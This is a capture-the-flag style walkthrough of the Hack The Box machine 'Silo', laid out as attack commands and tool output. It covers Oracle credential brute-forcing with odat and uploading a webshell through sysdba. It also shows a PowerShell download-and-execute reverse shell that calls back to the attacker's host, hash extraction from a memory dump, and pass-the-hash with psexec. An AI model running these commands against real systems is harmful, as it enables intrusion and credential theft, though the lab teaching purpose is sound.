# Story
- Oracle TNS listener is there, so attack that with odat
- scott can login the db as sysdba
- sysdba can upload files, so we upload webshell in webroot
- run whatever in the webshell, so we can get revshell
- look for something useful in the machine
- There is a link for dropbox and we can download memory dump from it
- use volality3 to get admin hash information
- we can login using hash as admin
- get root flag

# Enumeration

## nmap

```
nmap -sC -sV silo.htb      
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-19 21:13 EST
Nmap scan report for silo.htb (10.129.95.188)
Host is up (0.19s latency).
Not shown: 988 closed tcp ports (conn-refused)
PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 8.5
|_http-server-header: Microsoft-IIS/8.5
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
1521/tcp  open  oracle-tns   Oracle TNS listener 11.2.0.2.0 (unauthorized)
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49159/tcp open  oracle-tns   Oracle TNS listener (requires service name)
49160/tcp open  msrpc        Microsoft Windows RPC
49161/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: supported
|_clock-skew: mean: 4s, deviation: 0s, median: 3s
| smb2-security-mode: 
|   302: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-02-20T02:15:42
|_  start_date: 2023-02-20T02:12:04

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 159.56 seconds

```

## feroxbuster
```
feroxbuster -u http://silo.htb -k
[####################] - 2m     30000/30000   243/s   http://silo.htb/aspnet_Client/ 
[####################] - 2m     30000/30000   239/s   http://silo.htb/aspnet_client/system_web/ 
```


## Check the website
![[Pasted image 20230220111919.png]]
Win server?
/aspnet_client,/system_web I could not access


## SMB 445

### smbclient
```
smbclient -N -L silo.htb  
session setup failed: NT_STATUS_ACCESS_DENIED
```

### smbmap
```
smbmap -H silo.htb
[!] Authentication error on silo.htb
```

### Crackmapexec

```
crackmapexec smb silo.htb        
SMB         silo.htb        445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
                                                                       
```

```
crackmapexec smb silo.htb --shares
SMB         silo.htb        445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
SMB         silo.htb        445    SILO             [-] Error enumerating shares: [Errno 32] Broken pipe
                             
```

```
crackmapexec smb silo.htb --users 
SMB         silo.htb        445    SILO             [*] Windows Server 2012 R2 Standard 9600 x64 (name:SILO) (domain:SILO) (signing:False) (SMBv1:True)
SMB         silo.htb        445    SILO             [-] Error enumerating domain users using dc ip silo.htb: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         silo.htb        445    SILO             [*] Trying with SAMRPC protocol
                
```


## oracle 1521

## odat
get service name

https://github.com/quentinhardy/odat

normal
```shell
odat sidguesser -s silo.htb

[1] (10.129.95.188:1521): Searching valid SIDs                                      
[1.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server                                                                             
[+] 'XE' is a valid SID. Continue...    ########################## | ETA:  00:00:01 
100% |#############################################################| Time: 00:02:27 
[1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)                                                                           
100% |#############################################################| Time: 00:00:04 
[1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)                                                                           
[+] 'XE' is a valid SID. Continue...    ####################       | ETA:  00:00:14 
100% |#############################################################| Time: 00:02:12 
[+] SIDs found on the 10.129.95.188:1521 server: XE
```

full
```shell
  sudo odat all -s silo.htb -p 1521
[sudo] password for kali: 
[+] Checking if target 10.129.95.188:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.95.188:1521 is well configured. Continue...

[1] (10.129.95.188:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?                                                                                               
[+] Impossible to know if target is vulnerable to a remote TNS poisoning because SID is not given.

[2] (10.129.95.188:1521): Searching valid SIDs                                                                                                                             
[2.1] Searching valid SIDs thanks to a well known SID list on the 10.129.95.188:1521 server
[+] 'XE' is a valid SID. Continue...  ##################################################################################################################  | ETA:  00:00:01 
100% |####################################################################################################################################################| Time: 00:02:26 
[2.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)
100% |####################################################################################################################################################| Time: 00:00:04 
[2.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)
[+] 'XE' is a valid SID. Continue...  ###################################################################################################                 | ETA:  00:00:14 
100% |####################################################################################################################################################| Time: 00:02:10 
[+] SIDs found on the 10.129.95.188:1521 server: XE

[3] (10.129.95.188:1521): Searching valid Service Names                                                                                                                    
[3.1] Searching valid Service Names thanks to a well known Service Name list on the 10.129.95.188:1521 server
[+] 'XE' is a valid Service Name. Continue...                               ############################################################################  | ETA:  00:00:01 
[+] 'XEXDB' is a valid Service Name. Continue...                            
100% |####################################################################################################################################################| Time: 00:02:26 
[3.2] Searching valid Service Names thanks to a brute-force attack on 1 chars now (10.129.95.188:1521)
100% |####################################################################################################################################################| Time: 00:00:04 
[3.3] Searching valid Service Names thanks to a brute-force attack on 2 chars now (10.129.95.188:1521)
[+] 'XE' is a valid Service Name. Continue...                               #############################################################                 | ETA:  00:00:14 
100% |####################################################################################################################################################| Time: 00:02:11 
[+] Service Name(s) found on the 10.129.95.188:1521 server: XE,XEXDB
[!] Notice: SID 'XE' found. Service Name 'XE' found too: Identical database instance. Removing Service Name 'XE' from Service Name list in order to don't do same checks twice                                                                                                                                                                        

[4] (10.129.95.188:1521): Searching valid accounts on the XE SID                                                                                                           
The login cis has already been tested at least once. What do you want to do:                                                                              | ETA:  00:07:33 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                            | ETA:  00:08:39 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                            | ETA:  00:08:18 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                               | ETA:  00:07:49 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                                | ETA:  00:06:18 
[!] Notice: 'mdsys' account is locked, so skipping this username for password#                                                                            | ETA:  00:04:48 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password############                                                            | ETA:  00:03:44 
[!] Notice: 'outln' account is locked, so skipping this username for password#######################                                                      | ETA:  00:03:20 
[+] Valid credentials found: scott/tiger. Continue...                       ################################################                              | ETA:  00:01:50 
[!] Notice: 'xdb' account is locked, so skipping this username for password#########################################################################      | ETA:  00:00:21 
100% |####################################################################################################################################################| Time: 00:09:08 
[+] Accounts found on 10.129.95.188:1521/sid:XE: 
scott/tiger                                                                                                                                                                
                                                                                                                                                                           

[5] (10.129.95.188:1521): Searching valid accounts on the XEXDB Service Name                                                                                               
The login abm has already been tested at least once. What do you want to do:                                                                              | ETA:  --:--:-- 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'ctxsys' account is locked, so skipping this username for password                                                                            | ETA:  00:14:16 
[!] Notice: 'dbsnmp' account is locked, so skipping this username for password                                                                            | ETA:  00:13:14 
[!] Notice: 'dip' account is locked, so skipping this username for password                                                                               | ETA:  00:11:55 
[!] Notice: 'hr' account is locked, so skipping this username for password                                                                                | ETA:  00:08:36 
[!] Notice: 'mdsys' account is locked, so skipping this username for password#                                                                            | ETA:  00:06:05 
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password############                                                            | ETA:  00:04:33 
[!] Notice: 'outln' account is locked, so skipping this username for password#######################                                                      | ETA:  00:04:02 
[+] Valid credentials found: scott/tiger. Continue...                       ################################################                              | ETA:  00:02:08 
[!] Notice: 'xdb' account is locked, so skipping this username for password#########################################################################      | ETA:  00:00:25 
100% |####################################################################################################################################################| Time: 00:10:22 
[+] Accounts found on 10.129.95.188:1521/serviceName:XEXDB: 
scott/tiger                                                                                                                                                                
                                                                                                                                                                           

[6] (10.129.95.188:1521): Testing all authenticated modules on sid:XE with the scott/tiger account                                                                         
[6.1] UTL_HTTP library ?
[-] KO
[6.2] HTTPURITYPE library ?
23:26:31 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-24247: network access denied by access control list (ACL) ORA-06512: at "SYS.HTTPURITYPE", line 34`                                          
[-] KO
[6.3] UTL_FILE library ?
[-] KO
[6.4] JAVA library ?
[-] KO
[6.5] DBMSADVISOR library ?
[-] KO
[6.6] DBMSSCHEDULER library ?
[-] KO
[6.7] CTXSYS library ?
[-] KO
[6.8] Hashed Oracle passwords ?
[-] KO
[6.9] Hashed Oracle passwords with a view in ORACLE_OCM?
23:26:32 WARNING -: Hashes can not be got with Oracle_OCM. This method is only valid when database is 12c or higher
[-] KO
[-] KO
[6.10] Hashed Oracle passwords from history?
[-] KO
[6.11] DBMS_XSLPROCESSOR library ?
[-] KO
[6.12] External table to read files ?
[-] KO
[6.13] External table to execute system commands ?
[-] KO
[6.14] Oradbg ?
[-] KO
[6.15] DBMS_LOB to read files ?
[-] KO
[6.16] SMB authentication capture ?
[-] KO
[6.17] Gain elevated access (privilege escalation)?
[6.17.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[-] KO
[6.17.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[6.17.3] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[6.17.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[6.17.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[6.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[6.19] Create file on target (CVE-2018-3004)?
[-] KO
[6.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[-] KO

[7] (10.129.95.188:1521): Oracle users have not the password identical to the username ?                                                                                   
[!] Notice: 'XS$NULL' account is locked, so skipping this username for password                                                                           | ETA:  00:00:00 
The login XS$NULL has already been tested at least once. What do you want to do:                                                                          | ETA:  00:00:16 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'APEX_040000' account is locked, so skipping this username for password                                                                       | ETA:  00:00:38 
[!] Notice: 'APEX_PUBLIC_USER' account is locked, so skipping this username for password                                                                  | ETA:  00:00:29 
[!] Notice: 'FLOWS_FILES' account is locked, so skipping this username for password                                                                       | ETA:  00:00:23 
[!] Notice: 'HR' account is locked, so skipping this username for password                                                                                | ETA:  00:00:19 
[!] Notice: 'MDSYS' account is locked, so skipping this username for password                                                                             | ETA:  00:00:16 
[!] Notice: 'XDB' account is locked, so skipping this username for password#####                                                                          | ETA:  00:00:13 
[!] Notice: 'CTXSYS' account is locked, so skipping this username for password##########                                                                  | ETA:  00:00:11 
[!] Notice: 'APPQOSSYS' account is locked, so skipping this username for password################                                                         | ETA:  00:00:09 
[!] Notice: 'DBSNMP' account is locked, so skipping this username for password############################                                                | ETA:  00:00:07 
[!] Notice: 'ORACLE_OCM' account is locked, so skipping this username for password################################                                        | ETA:  00:00:06 
[!] Notice: 'DIP' account is locked, so skipping this username for password################################################                               | ETA:  00:00:04 
[!] Notice: 'OUTLN' account is locked, so skipping this username for password#######################################################                      | ETA:  00:00:03 
100% |####################################################################################################################################################| Time: 00:00:27 
[-] No found a valid account on 10.129.95.188:1521/sid:XE with usernameLikePassword module

[8] (10.129.95.188:1521): Testing all authenticated modules on ServiceName:XEXDB with the scott/tiger account                                                              
[8.1] UTL_HTTP library ?
[-] KO
[8.2] HTTPURITYPE library ?
23:27:17 WARNING -: Impossible to fetch all the rows of the query select httpuritype('http://0.0.0.0/').getclob() from dual: `ORA-29273: HTTP request failed ORA-06512: at "SYS.UTL_HTTP", line 1819 ORA-24247: network access denied by access control list (ACL) ORA-06512: at "SYS.HTTPURITYPE", line 34`                                          
[-] KO
[8.3] UTL_FILE library ?
[-] KO
[8.4] JAVA library ?
[-] KO
[8.5] DBMSADVISOR library ?
[-] KO
[8.6] DBMSSCHEDULER library ?
[-] KO
[8.7] CTXSYS library ?
[-] KO
[8.8] Hashed Oracle passwords ?
[-] KO
[8.9] Hashed Oracle passwords with a view in ORACLE_OCM?
23:27:18 WARNING -: Hashes can not be got with Oracle_OCM. This method is only valid when database is 12c or higher
[-] KO
[-] KO
[8.10] Hashed Oracle passwords from history?
[-] KO
[8.11] DBMS_XSLPROCESSOR library ?
[-] KO
[8.12] External table to read files ?
[-] KO
[8.13] External table to execute system commands ?
[-] KO
[8.14] Oradbg ?
[-] KO
[8.15] DBMS_LOB to read files ?
[-] KO
[8.16] SMB authentication capture ?
[-] KO
[8.17] Gain elevated access (privilege escalation)?
[8.17.6] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[-] KO
[8.17.7] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[8.17.8] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[8.17.9] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[8.17.10] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[-] KO
[8.18] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[-] KO
[8.19] Create file on target (CVE-2018-3004)?
[-] KO
[8.20] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[-] KO

[9] (10.129.95.188:1521): Oracle users have not the password identical to the username ?                                                                                   
The login XS$NULL has already been tested at least once. What do you want to do:                                                                          | ETA:  00:00:00 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'XS$NULL' account is locked, so skipping this username for password                                                                                            
[!] Notice: 'APEX_040000' account is locked, so skipping this username for password                                                                       | ETA:  00:00:36 
[!] Notice: 'APEX_PUBLIC_USER' account is locked, so skipping this username for password                                                                  | ETA:  00:00:28 
[!] Notice: 'FLOWS_FILES' account is locked, so skipping this username for password                                                                       | ETA:  00:00:23 
[!] Notice: 'HR' account is locked, so skipping this username for password                                                                                | ETA:  00:00:19 
[!] Notice: 'MDSYS' account is locked, so skipping this username for password                                                                             | ETA:  00:00:16 
[!] Notice: 'XDB' account is locked, so skipping this username for password#####                                                                          | ETA:  00:00:12 
[!] Notice: 'CTXSYS' account is locked, so skipping this username for password##########                                                                  | ETA:  00:00:10 
[!] Notice: 'APPQOSSYS' account is locked, so skipping this username for password################                                                         | ETA:  00:00:09 
[!] Notice: 'DBSNMP' account is locked, so skipping this username for password############################                                                | ETA:  00:00:07 
[!] Notice: 'ORACLE_OCM' account is locked, so skipping this username for password################################                                        | ETA:  00:00:06 
[!] Notice: 'DIP' account is locked, so skipping this username for password################################################                               | ETA:  00:00:04 
[!] Notice: 'OUTLN' account is locked, so skipping this username for password#######################################################                      | ETA:  00:00:03 
100% |####################################################################################################################################################| Time: 00:00:31 
[-] No found a valid account on 10.129.95.188:1521/ServiceName:XEXDB with usernameLikePassword module
```

SID:XE
Username: scott
Password:tiger
## metasploit

```shell
msf6 auxiliary(admin/oracle/sid_brute) > run
[*] Running module against 10.192.95.188

[*] 10.192.95.188:1521 - Starting brute force on 10.192.95.188, using sids from /usr/share/metasploit-framework/data/wordlists/sid.txt...
[-] 10.192.95.188:1521 - The connection with (10.192.95.188:1521) timed out.
[*] Auxiliary module execution completed
```

## oracle pentesting
https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/oracle-pentesting-requirements-installation


or
```
sudo apt install oracle-instantclient-sqlplus
echo "/usr/lib/oracle/19.6/client64/lib/libsqlplus.so" >> /etc/ld.so.conf
```

## login
```
sudo sqlplus scott/tiger@silo.htb/XE  
```

![[Pasted image 20230220135741.png]]


```
SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

## sysdba login?
` sudo sqlplus scott/tiger@silo.htb/XE 'as sysdba'`

```

SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
SYS                            EXP_FULL_DATABASE              YES YES NO
SYS                            GATHER_SYSTEM_STATISTICS       YES YES NO
SYS                            HS_ADMIN_EXECUTE_ROLE          YES YES NO
SYS                            HS_ADMIN_ROLE                  YES YES NO
SYS                            HS_ADMIN_SELECT_ROLE           YES YES NO
SYS                            IMP_FULL_DATABASE              YES YES NO
SYS                            LOGSTDBY_ADMINISTRATOR         YES YES NO
SYS                            OEM_ADVISOR                    YES YES NO
SYS                            OEM_MONITOR                    YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            PLUSTRACE                      YES YES NO
SYS                            RECOVERY_CATALOG_OWNER         YES YES NO
SYS                            RESOURCE                       YES YES NO
SYS                            SCHEDULER_ADMIN                YES YES NO
SYS                            SELECT_CATALOG_ROLE            YES YES NO
SYS                            XDBADMIN                       YES YES NO
SYS                            XDB_SET_INVOKER                YES YES NO
SYS                            XDB_WEBSERVICES                YES YES NO
SYS                            XDB_WEBSERVICES_OVER_HTTP      YES YES NO
SYS                            XDB_WEBSERVICES_WITH_PUBLIC    YES YES NO

32 rows selected.

```

## odat again
```
odat all -s silo.htb -p 1521 -d XE -U scott -P tiger --sysdba
[+] Checking if target 10.129.95.188:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.95.188:1521 is well configured. Continue...

[1] (10.129.95.188:1521): Is it vulnerable to TNS poisoning (CVE-2012-1675)?                                                                                               
[+] The target is vulnerable to a remote TNS poisoning

[2] (10.129.95.188:1521): Testing all authenticated modules on sid:XE with the scott/tiger account                                                                         
[2.1] UTL_HTTP library ?
[+] OK
[2.2] HTTPURITYPE library ?
[+] OK
[2.3] UTL_FILE library ?
[+] OK
[2.4] JAVA library ?
[-] KO
[2.5] DBMSADVISOR library ?
[+] OK
[2.6] DBMSSCHEDULER library ?
[+] OK
[2.7] CTXSYS library ?
[+] OK
[2.8] Hashed Oracle passwords ?
[+] OK
[2.9] Hashed Oracle passwords from history?
[+] OK
[2.10] DBMS_XSLPROCESSOR library ?
[+] OK
[2.11] External table to read files ?
[+] OK
[2.12] External table to execute system commands ?
[+] OK
[2.13] Oradbg ?
[-] KO
[2.14] DBMS_LOB to read files ?
[+] OK
[2.15] SMB authentication capture ?
[+] Perhaps (try with --capture to be sure)
[2.16] Gain elevated access (privilege escalation)?
[2.16.1] DBA role using CREATE/EXECUTE ANY PROCEDURE privileges?
[+] OK
[2.16.2] Modification of users' passwords using CREATE ANY PROCEDURE privilege only?
[-] KO
[2.16.3] DBA role using CREATE ANY TRIGGER privilege?
[-] KO
[2.16.4] DBA role using ANALYZE ANY (and CREATE PROCEDURE) privileges?
[-] KO
[2.16.5] DBA role using CREATE ANY INDEX (and CREATE PROCEDURE) privileges?
[+] OK
[2.17] Modify any table while/when he can select it only normally (CVE-2014-4237)?
[+] Impossible to know
[2.18] Create file on target (CVE-2018-3004)?
[-] KO
[2.19] Obtain the session key and salt for arbitrary Oracle users (CVE-2012-3137)?
[+] Impossible to know if the database is vulnreable to the CVE-2012-3137. You need to run this as root because it needs to sniff authentications to the database

[3] (10.129.95.188:1521): Oracle users have not the password identical to the username ?                                                                                   
The login XS$NULL has already been tested at least once. What do you want to do:                                                                          | ETA:  00:00:00 
- stop (s/S)
- continue and ask every time (a/A)
- skip and continue to ask (p/P)
- continue without to ask (c/C)
c
[!] Notice: 'XS$NULL' account is locked, so skipping this username for password
[!] Notice: 'APEX_040000' account is locked, so skipping this username for password                                                                       | ETA:  00:00:52 
[!] Notice: 'APEX_PUBLIC_USER' account is locked, so skipping this username for password                                                                  | ETA:  00:00:38 
[!] Notice: 'FLOWS_FILES' account is locked, so skipping this username for password                                                                       | ETA:  00:00:30 
[!] Notice: 'HR' account is locked, so skipping this username for password                                                                                | ETA:  00:00:24 
[!] Notice: 'MDSYS' account is locked, so skipping this username for password                                                                             | ETA:  00:00:20 
[!] Notice: 'XDB' account is locked, so skipping this username for password#####                                                                          | ETA:  00:00:15 
[!] Notice: 'CTXSYS' account is locked, so skipping this username for password##########                                                                  | ETA:  00:00:13 
[!] Notice: 'APPQOSSYS' account is locked, so skipping this username for password################                                                         | ETA:  00:00:10 
[!] Notice: 'DBSNMP' account is locked, so skipping this username for password############################                                                | ETA:  00:00:08 
[!] Notice: 'ORACLE_OCM' account is locked, so skipping this username for password################################                                        | ETA:  00:00:07 
[!] Notice: 'DIP' account is locked, so skipping this username for password################################################                               | ETA:  00:00:05 
[!] Notice: 'OUTLN' account is locked, so skipping this username for password#######################################################                      | ETA:  00:00:03 
100% |####################################################################################################################################################| Time: 00:00:38 
[-] No found a valid account on 10.129.95.188:1521/sid:XE with usernameLikePassword module

```


##
https://github.com/quentinhardy/odat/blob/master-python3/pictures/odat_mind_map_v1.0.jpg

## upload text
https://0xdf.gitlab.io/2018/08/04/htb-silo.html
```
┌──(kali㉿kali)-[~]
└─$ odat dbmsxslprocessor -s silo.htb -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot tofu.txt <(echo tofu was here)

[1] (10.129.95.188:1521): Put the /proc/self/fd/11 local file in the C:\inetpub\wwwroot path (named tofu.txt) of the 10.129.95.188 server                                  
[+] The /proc/self/fd/11 local file was put in the remote C:\inetpub\wwwroot path (named tofu.txt)
                                                                                                                                                                           
┌──(kali㉿kali)-[~]
└─$ curl http://silo.htb/tofu.txt
tofu was here
```


## upload web shell
https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx

```
┌──(kali㉿kali)-[~/Documents/Tools]
└─$ odat dbmsxslprocessor -s silo.htb -d XE -U SCOTT -P tiger --sysdba --putFile C:\\inetpub\\wwwroot webshell.aspx ~/Documents/Tools/webshell.aspx

[1] (10.129.95.188:1521): Put the /home/kali/Documents/Tools/webshell.aspx local file in the C:\inetpub\wwwroot path (named webshell.aspx) of the 10.129.95.188 server     
[+] The /home/kali/Documents/Tools/webshell.aspx local file was put in the remote C:\inetpub\wwwroot path (named webshell.aspx)
```

## Access webshell
```
http://silo.htb/webshell.aspx
```

![[Pasted image 20230220142906.png]]

## revshell

https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1
```
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.15.48 -Port 8084
```
add it

```
python3 -m http.server 8000
```

Run it in webshell
`powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3:8000/Invoke-PowerShellTcp.ps1')`

```
nc -lnvp 1234
```

![[Pasted image 20230220143751.png]]

## shell
```
nc -lnvp 1234                                    
listening on [any] 1234 ...
connect to [10.10.14.3] from (UNKNOWN) [10.129.95.188] 49172
Windows PowerShell running as user SILO$ on SILO
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\windows\system32\inetsrv>whoami 
iis apppool\defaultapppool
PS C:\windows\system32\inetsrv> 

```

## User flag
```
PS C:\Users\Phineas\Desktop> ls


    Directory: C:\Users\Phineas\Desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---          1/5/2018  10:56 PM        300 Oracle issue.txt                  
-ar--         2/20/2023   2:12 AM         34 user.txt                          


PS C:\Users\Phineas\Desktop> type user.txt

```

# Privilege Escalation
## oracle issue text
```
PS C:\Users\Phineas\Desktop> type 'Oracle issue.txt'
Support vendor engaged to troubleshoot Windows / Oracle performance issue (full memory dump requested):

Dropbox link provided to vendor (and password under separate cover).

Dropbox link 
https://www.dropbox.com/sh/69skryzfszb7elq/AADZnQEbbqDoIf5L2d0PBxENa?dl=0

link password:
?%Hm8646uC$
```

## Dropbox
![[Pasted image 20230220144106.png]]


![[Pasted image 20230220144401.png]]

`£%Hm8646uC$`

![[Pasted image 20230220144548.png]]


## dumpfile
```
file SILO-20180105-221806.dmp
SILO-20180105-221806.dmp: MS Windows 64bit crash dump, full dump, 261996 pages
```

## VT

```
md5sum SILO-20180105-221806.dmp
04a302e67113e9f02fda3283dace7898  SILO-20180105-221806.dmp
```

![[Pasted image 20230220145454.png]]


## volatility3
```
git clone https://github.com/volatilityfoundation/volatility3.git
```

```
python3 vol.py -h
```

```
python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.info
Variable        Value

Kernel Base     0xf8007828a000
DTB     0x1a7000
Symbols file:///home/kali/Documents/htb/Silo/volatility3/volatility3/symbols/windows/ntkrnlmp.pdb/A9BBA3C139724A738BE17665DB4393CA-1.json.xz
Is64Bit True
IsPAE   False
layer_name      0 WindowsIntel32e
memory_layer    1 WindowsCrashDump64Layer
base_layer      2 FileLayer
KdVersionBlock  0xf80078520d90
Major/Minor     15.9600
MachineType     34404
KeNumberProcessors      2
SystemTime      2018-01-05 22:18:07
NtSystemRoot    C:\Windows
NtProductType   NtProductServer
NtMajorVersion  6
NtMinorVersion  3
PE MajorOperatingSystemVersion  6
PE MinorOperatingSystemVersion  3
PE Machine      34404
PE TimeDateStamp        Thu Aug 22 08:52:38 2013

```

```
python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.hashdump.Hashdump -vvv
Volatility 3 Framework 2.4.1
INFO     volatility3.cli: Volatility plugins path: ['/home/kali/Documents/htb/Silo/volatility3/volatility3/plugins', '/home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins']
INFO     volatility3.cli: Volatility symbols path: ['/home/kali/Documents/htb/Silo/volatility3/volatility3/symbols', '/home/kali/Documents/htb/Silo/volatility3/volatility3/framework/symbols']
DEBUG    volatility3.framework: No module named 'Crypto'
DEBUG    volatility3.framework: Failed to import module volatility3.plugins.windows.cachedump based on file: /home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins/windows/cachedump.py
DEBUG    volatility3.framework: No module named 'Crypto'
DEBUG    volatility3.framework: Failed to import module volatility3.plugins.windows.lsadump based on file: /home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins/windows/lsadump.py
DEBUG    volatility3.framework: No module named 'Crypto'
DEBUG    volatility3.framework: Failed to import module volatility3.plugins.windows.hashdump based on file: /home/kali/Documents/htb/Silo/volatility3/volatility3/framework/plugins/windows/hashdump.py
```

```
pip install pycryptodome
```

```
python3 vol.py -f ~/Documents/htb/Silo/SILO-20180105-221806.dmp windows.hashdump.Hashdump     
Volatility 3 Framework 2.4.1
Progress:  100.00               PDB scanning finished                                
User    rid     lmhash  nthash

Administrator   500     aad3b435b51404eeaad3b435b51404ee        9e730375b7cbcebf74ae46481e07b0c7
Guest   501     aad3b435b51404eeaad3b435b51404ee        31d6cfe0d16ae931b73c59d7e0c089c0
Phineas 1002    aad3b435b51404eeaad3b435b51404ee        8eacdd67b77749e65d3b3d5c110b0969
```

## root
```
python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:9e730375b7cbcebf74ae46481e07b0c7 -target-ip silo.htb administrator@silo.htb
Impacket v0.10.1.dev1+20230216.13520.d4c06e7f - Copyright 2022 Fortra

[*] Requesting shares on silo.htb.....
[*] Found writable share ADMIN$
[*] Uploading file FZbfCnbH.exe
[*] Opening SVCManager on silo.htb.....
[*] Creating service SQKD on silo.htb.....
[*] Starting service SQKD.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 

```


## Flag
under `/Users/Administrator/Desktop/root.txt`
